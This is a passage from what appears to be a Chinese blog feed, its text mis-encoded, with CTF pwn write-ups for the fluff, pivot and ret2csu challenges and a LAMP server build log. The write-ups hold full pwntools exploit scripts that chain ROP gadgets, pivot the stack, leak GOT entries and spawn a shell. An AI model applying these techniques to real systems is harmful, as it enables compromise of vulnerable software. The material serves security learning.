title="fluff"></a>fluff</h2><p>è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯è·Ÿwrite4å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯æ‰¾å¯ç”¨çš„gadgetæ˜¯ï¼Œæ¯”è¾ƒéš¾æ‰¾ã€‚éœ€è¦æƒ³å°½åŠæ³•æ‰¾å„ç§gadgetï¼Œç„¶åå åŠ åœ¨ä¸€èµ·æˆä¸ºéœ€è¦çš„é“¾ã€‚è¿™ä¸ªé¢˜çªç ´å£ä¹Ÿå°±åœ¨ï¼š</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>ç„¶åå†å»æ‰¾ecxï¼Œedxç›¸å…³çš„gadgetï¼Œé‡Œé¢ç”¨åˆ°äº†xorå’Œxchgç­‰ç›¸å…³çš„gadgetã€‚<br>å…¶ä¸­64ä½çš„æ‰¾å¯ç”¨gadgetï¼Œè¿˜éœ€è¦æ§åˆ¶ä¸€ä¸‹æ·±åº¦ï¼š</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>è¿™æ ·æ‰¾å‡ºè¶³å¤Ÿçš„gadgetï¼Œä»¥ä¾¿è‡ªå·±è¯•ç”¨ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32ä½ï¼š-4"><a href="#32ä½ï¼š-4" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-4"><a href="#64ä½ï¼š-4" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>è¿™ä¸ªé¢˜ä¸€çœ‹å°±æ˜¯æ ˆè½¬ç§»äº†ã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹åˆ°ä¼šç»™ä½ æ³„æ¼ä¸€ä¸ªå †åœ°å€ï¼Œç»™ä½ å»æ ˆè½¬ç§»ã€‚<br>æ¥ç€çœ‹åé—¨å‡½æ•°ï¼Œå‘ç°è¿™é‡Œcallä¸€ä¸ªä¸libcè¿æ¥çš„å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>æ¥ç€åˆ†æä¸€ä¸‹ç»™å®šçš„soæ–‡ä»¶ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>æ¥ç€å°±æœ‰æ€è·¯äº†ï¼Œæ ˆè½¬ç§»åˆ°ç»™ä½ çš„å †åœ°å€ä¸Šï¼Œç„¶åæ„é€ ropé“¾ï¼š</p><ul><li>leak <code>foothold_function_got</code></li><li>ç®—å‡ºç»™çš„libcåŸºå€ï¼Œå›åˆ°startï¼Œå†æ¬¡åˆ©ç”¨æ¼æ´</li><li>æ„é€ jmpåˆ°ret2winçš„é“¾å³å¯<br>ä½†æ˜¯è¿™ä¸ªé¢˜ç›®è¿˜æ˜¯æœ‰æŠ€å·§çš„ï¼Œå‘ç°ç»™ä½ çš„å †åœ°å€å…¶å®è·Ÿè¿™ä¸ªlibcçš„å†…å­˜æ˜ å°„æ˜¯å¾ˆè¿‘çš„ï¼Œå¹¶ä¸”æ¯æ¬¡å·®è·ä¹Ÿæ˜¯å›ºå®šçš„ã€‚é‚£å°±å¯ä»¥ç›´æ¥åˆ†æsoæ–‡ä»¶ï¼Œæ¥ç®—å–åç§»ï¼Œç›´æ¥åˆ©ç”¨ã€‚</li></ul><p>æ ¹æ®ç»™çš„å †åœ°å€å’Œsoæ–‡ä»¶æ˜ å°„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32ä½ï¼š-5"><a href="#32ä½ï¼š-5" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-5"><a href="#64ä½ï¼š-5" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>è¿™ä¸ªåœ°æ–¹å› ä¸ºæ˜¯fgetså‡½æ•°æ¥è·å–å­—ç¬¦ä¸²ï¼Œå…¶é‡åˆ°æ¢è¡Œå°±ä¼šç»“æŸï¼Œä½†æ˜¯åœ¨æ‰¾gadgat çš„æ—¶å€™å‘ç°<code>leave ret</code>çš„è¿™ä¸ªgadgetï¼Œåœ°å€éƒ½æ˜¯æœ‰<code>0x0a</code>,æ‰€ä»¥åªèƒ½æ›´æ¢gadgetï¼Œæ¥ä¼ªé€ æ ˆã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32ä½ï¼š-6"><a href="#32ä½ï¼š-6" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64ä½ï¼š-6"><a href="#64ä½ï¼š-6" class="headerlink" title="64ä½ï¼š"></a>64ä½ï¼š</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å†è€ƒret2csuï¼ˆ64ä½çš„ä¸‡èƒ½gadgetï¼‰ï¼Œè®©ä½ æ§åˆ¶rdxï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼‰ä¸º<code>0xdeadcafebabebeef</code> å°±å¯ä»¥äº†ã€‚ä½†æ˜¯æ¯”è¾ƒéš¾æçš„ä¸€ç‚¹æ˜¯ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªåœ°æ–¹æ˜¯callï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥å¡«ä¸€ä¸ªgotçš„åœ°å€ã€‚ä¸èƒ½æ˜¯ä¸€ä¸ªåœ°å€æˆ–è€…pltã€‚å› ä¸º<code>call 0xaaaaa</code> æ±‡ç¼–ä½œç”¨ï¼š</p><ul><li>push PCï¼ˆä¹Ÿå°±æ˜¯è¯¥æ±‡ç¼–æŒ‡ä»¤çš„ä¸‹ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤çš„åœ°å€ï¼‰</li><li><code>jmp [0xaaaaa]</code> æ˜¯è¯¥å‡½æ•°pointæŒ‡å‘çš„åœ°å€</li></ul><p>è¿™ä¸ªé¢˜ç›®åœ¨callå®Œæ¯ä¸€ä¸ªå‡½æ•°è‡ªå¸¦çš„æ­£å¸¸åº“å‡½æ•°åï¼Œéƒ½å°†å…¶gotè¡¨æ¸…0ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>ä½†æ˜¯ä¼šå‘ç°ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥<code>_DYNAMIC</code>çš„ä¿¡æ¯ï¼Œè·Ÿè¿›å»ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>å‘ç°ä¸€å †åˆå§‹åŒ–ç”¨çš„å‡½æ•°ã€‚ç„¶åç‚¹è¿›å»ç¬¬ä¸€ä¸ªå¯ä»¥çœ‹çœ‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>å‘ç°è¿™é‡Œä¹Ÿæ²¡æœ‰å¯¹rdxè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚ç°åœ¨å°±æ˜¯ç¡®å®šä¸€ä¸‹å“ªé‡Œå­˜æ”¾ç€<code>0x400560</code>ï¼Œæ¯«æ— ç–‘é—®è‚¯å®šæ˜¯è¿™ä¸ª<code>_DYNAMIC</code>é‡Œï¼Œä½†æ˜¯è‡ªå·±ç›®å‰è¿˜ä¸ç†Ÿæ‚‰è¿™ä¸ªç»“æ„ï¼Œçœ‹èµ·æ¥è²Œä¼¼æ˜¯ä¸ªç»“æ„ä½“ã€‚å…ˆgdbè·Ÿå…¥æŸ¥çœ‹å§ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>å‘ç°åº”è¯¥æ˜¯<code>0x0600E38</code>ã€‚æ¥ä¸‹æ¥çš„å°±ç®€å•äº†ï¼Œä¼ ç»Ÿçš„ret2csuã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- Lampæ­å»ºè®°å½•</title>
    <link href="/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Lampæ­å»ºè®°å½•"><a href="#Lampæ­å»ºè®°å½•" class="headerlink" title="Lampæ­å»ºè®°å½•"></a>Lampæ­å»ºè®°å½•</h1><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><h3 id="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"><a href="#å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š" class="headerlink" title="å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š"></a>å®‰è£…ç¼–è¯‘ç¯å¢ƒï¼š</h3><pre><code>yum -y install gcc*</code></pre><p>å®‰è£…å¥½åè®°å¾—å…³é—­é˜²ç«å¢™å’Œselinux</p><h3 id="å‡†å¤‡è½¯ä»¶åŒ…"><a href="#å‡†å¤‡è½¯ä»¶åŒ…" class="headerlink" title="å‡†å¤‡è½¯ä»¶åŒ…"></a>å‡†å¤‡è½¯ä»¶åŒ…</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>æŠŠè¿™äº›å®‰è£…åŒ…éƒ½æ”¾å…¥è™šæ‹Ÿæœºè‡ªå®šä¹‰çš„è·¯å¾„ï¼Œç­‰å¾…ä½¿ç”¨ã€‚</p><h3 id="shellè„šæœ¬æ‰¹é‡è§£åŒ…"><a href="#shellè„šæœ¬æ‰¹é‡è§£åŒ…" class="headerlink" title="shellè„šæœ¬æ‰¹é‡è§£åŒ…"></a>shellè„šæœ¬æ‰¹é‡è§£åŒ…</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>ç„¶åå¼€å§‹ä¸€ä¸€çš„è£…åŒ…ï¼Œæ³¨æ„éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ¥è£…çš„ã€‚</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>å®‰è£…pythonçš„åº•å±‚ç¯å¢ƒã€‚</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>æä¾›ä¸€äº›åŠ å¯†ç®—æ³•ï¼š</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>æä¾›åŠ å¯†æ–¹å¼çš„æ‰©å±•</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>æä¾›phpç›¸å…³çš„åŠ å¯†æ”¯æŒæ‹“å±•åº“</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>æä¾›å‹ç¼©ç”¨é€”çš„å‡½æ•°åº“</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>å¦‚æœå‡ºç°ï¼š</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>è§£å†³åŠæ³• ï¼š </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //è¿›å…¥zlibç›®å½•[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #ä½¿ç”¨64ä½å…ƒçš„æ–¹æ³•è¿›è¡Œç¼–è¯‘[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>ç„¶ååœ¨é‡æ–°æ¥å®‰è£…libpngå³å¯ã€‚</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>æä¾›jpegæ ¼å¼çš„å›¾ç‰‡</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>å¦‚æœå‘ç”Ÿè¿™æ ·çš„æŠ¥é”™ï¼š</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtoolï¼šå‘½ä»¤æœªæ‰¾åˆ°make: *** [jcapimin.lo] é”™è¯¯ 127</code></pre><p>éœ€è¦ï¼š</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cpï¼šæ˜¯å¦è¦†ç›–&quot;./config.guess&quot;ï¼Ÿ yes[root@localhost jpeg-6b]# make clean</code></pre><p>é‡æ–°å†æ¥å°±å¥½ã€‚</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>å­—ä½“åº“ã€‚</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>ç»™phpæä¾›å›¾å½¢æ‹“å±•çš„åº“</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>è¿™æ ·ä¼šçˆ†ä¸€ä¸ªé”™ï¼Œç„¶åéœ€è¦æ”¹ä¸€ä¸‹æºç ï¼š</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>éœ€è¦æŒ‡å®šä¸€ä¸‹è·¯å¾„å³å¯ï¼Œè¿™ä¸ªåˆšåˆšæ˜¯å·²ç»å®‰è£…è¿‡çš„ã€‚</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>å…ˆè£…ä¸¤ä¸ªå·¥å…·åŒ…ï¼š</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="å¼€å§‹è£…httpedï¼š"><a href="#å¼€å§‹è£…httpedï¼š" class="headerlink" title="å¼€å§‹è£…httpedï¼š"></a>å¼€å§‹è£…httpedï¼š</h3><p>å…ˆè¿›å…¥è£…ä¸€ä¸‹pcreï¼š</p><pre><code>./configuremakemake install</code></pre><p>è¿›å…¥httpedï¼š<br>å…ˆå¯¹é…ç½®è¿›è¡Œè®¾ç½®ï¼š</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="å¼€æœåŠ¡ï¼š"><a href="#å¼€æœåŠ¡ï¼š" class="headerlink" title="å¼€æœåŠ¡ï¼š"></a>å¼€æœåŠ¡ï¼š</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨"><a href="#è‡ªå¯åŠ¨" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>è®¾ç½®å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨è¿™ä¸ªæœåŠ¡ã€‚</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="å‡†å¤‡å·¥ä½œ-1"><a href="#å‡†å¤‡å·¥ä½œ-1" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>è£…ä¸¤ä¸ªå·¥å…·ï¼š</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼š</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) ç»„=1001(mysql)</code></pre><p>å®‰è£…ncursesï¼š</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="å¼€å§‹å®‰è£…"><a href="#å¼€å§‹å®‰è£…" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="ç®€å•è®¾ç½®"><a href="#ç®€å•è®¾ç½®" class="headerlink" title="ç®€å•è®¾ç½®"></a>ç®€å•è®¾ç½®</h3><p>åˆå§‹åŒ–mysqlï¼š</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>è®¾ç½®æƒé™ï¼š</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>è¦†ç›–ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcpï¼šæ˜¯å¦è¦†ç›–&quot;/etc/my.cnf&quot;ï¼Ÿ yes</code></pre><p>æ¥ç€åˆå§‹åŒ–ï¼š</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe 